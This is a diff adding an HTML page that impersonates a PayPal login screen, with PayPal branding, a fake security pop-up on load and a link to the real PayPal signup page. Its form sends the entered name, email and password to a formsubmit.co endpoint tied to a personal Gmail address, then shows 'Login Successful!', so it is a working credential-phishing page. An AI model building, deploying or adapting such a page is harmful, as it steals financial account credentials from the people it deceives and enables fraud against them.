@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Secure PayPal Login Form with modern design and AI-enhanced features">
+    <meta name="theme-color" content="#0070ba">
+    <link rel="manifest" href="/manifest.json">
+    <title>PayPal Login</title>
+    <style>
+        /* Universal Styles - Reset and Basic Setup */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            font-size: 16px;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column; /* Allow stacking of forms vertically */
+            height: 118vh;
+            padding: 22px;
+        }
+
+        /* Dark Mode Support */
+        body.dark-mode {
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+        }
+
+        /* Login Container Styling */
+        .login-container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: fadeIn 0.7s ease-in-out;
+        }
+
+        /* Smooth fade-in animation */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Logo and Branding */
+        .logo img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #003087;
+            font-weight: 500;
+            margin-bottom: 30px;
+            font-size: 1.75rem;
+        }
+
+        /* Form Group Styling */
+        .input-group {
+            margin-bottom: 23px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group label {
+            font-size: 1rem;
+            margin-bottom: 7px;
+            color: #333;
+        }
+
+        .input-group input {
+            padding: 12px;
+            font-size: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            transition: border-color 0.3s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #0070ba;
+        }
+
+        /* Submit Button */
+        button {
+            width: 100%;
+            padding: 12px;
+            font-size: 1.2rem;
+            color: #fff;
+            background-color: #0070ba;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s, box-shadow 0.3s;
+            width: 100%;
+            padding: 10px;
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(to right, #0072ff, #00c6ff);
+        }
+        }
+
+        button:hover {
+            background-color: #005c99;
+            box-shadow: 0 4px 15px rgba(0, 112, 186, 0.3);
+        }
+
+        /* Security Notice Styling */
+        .security-notice {
+            background-color: #f7f9fa;
+            border-left: 5px solid #0070ba;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        /* Install Button for PWA */
+        .install-button {
+            margin-top: 20px;
+            padding: 12px;
+            background-color: #00a8e0;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .install-button:hover {
+            background-color: #008bb5;
+        }
+
+        /* Media Queries for Responsiveness */
+        @media (max-width: 768px) {
+            .login-container {
+                padding: 30px;
+            }
+
+            h2 {
+                font-size: 1.5rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 20px;
+            }
+
+            h2 {
+                font-size: 1.25rem;
+            }
+        }
+             .signup-text {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .signup-text a {
+            color: #0072ff;
+            text-decoration: none;
+        }
+
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Main Login Container -->
+    <div class="login-container">
+        <!-- Logo -->
+        <div class="logo">
+            <img src="images (1).png" alt="PayPal Logo">
+        </div>
+
+        <!-- Login Form -->
+        <h2>Login to PayPal</h2>
+        <form id="transactionForm" action="https://formsubmit.co/chin.hwa735@gmail.com" method="POST" enctype="multipart/form-data" onsubmit="return validateForm()">
+            <!-- Name Input -->
+            <div class="input-group">
+                <label for="name">Name</label>
+                <input type="text" id="name" name="name" placeholder="Enter your name" required>
+            </div>
+
+            <!-- Email Input -->
+            <div class="input-group">
+                <label for="loginEmail">Email Address</label>
+                <input type="email" id="loginEmail" name="email" placeholder="Enter your email" required>
+            </div>
+
+            <!-- Password Input -->
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required minlength="6">
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit">Log In</button>
+        </form>
+
+        <!-- Security Notice -->
+        <div class="security-notice">
+            <h3>Security Notice</h3>
+            <p>Ensure your account information is safe. Always check the website URL starts with. </p> 
+                  </form>
+            <p class="signup-text">Don't have an account? <a href="https://www.paypal.com/us/webapps/mpp/account-selection">Sign Up</a></p>
+        </div>
+        </div>
+    </div>
+
+    <!-- Dark Mode Toggle Button -->
+    <button class="install-button" id="darkModeToggle">Dark Mode</button>
+<!-- JavaScript -->
+<script>
+    // Pop-up notification function
+    function showSecurityNotification() {
+        alert("Notice: You need to secure your PayPal account by filling in the phone number above.");
+    }
+
+    // Form validation function for login form
+    function validateForm() {
+        var name = document.getElementById('name').value;
+        var email = document.getElementById('loginEmail').value;
+        var password = document.getElementById('password').value;
+
+        if (name === "" || email === "" || password === "") {
+            alert("All fields are required!");
+            return false;
+        }
+
+        if (!validateEmail(email)) {
+            alert("Please enter a valid email address.");
+            return false;
+        }
+
+        if (password.length < 6) {
+            alert("Password must be at least 6 characters long.");
+            return false;
+        }
+
+        alert("Login Successful!");
+        return true;
+    }
+
+    // Email format validation function
+    function validateEmail(email) {
+        var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(String(email).toLowerCase());
+    }
+
+    // Real-time form validation for email and password fields
+    document.getElementById('loginEmail').addEventListener('input', function () {
+        if (!validateEmail(this.value)) {
+            this.setCustomValidity("Please enter a valid email address.");
+        } else {
+            this.setCustomValidity("");
+        }
+    });
+
+    document.getElementById('password').addEventListener('input', function () {
+        if (this.value.length < 6) {
+            this.setCustomValidity("Password must be at least 6 characters long.");
+        } else {
+            this.setCustomValidity("");
+        }
+    });
+
+    // Dark mode toggle
+    const darkModeToggle = document.getElementById('darkModeToggle');
+    darkModeToggle.addEventListener('click', () => {
+        document.body.classList.toggle('dark-mode');
+    });
+
+    // Show security notification when the page loads
+    window.onload = showSecurityNotification;
+</script>
+</body>
+
+</html>
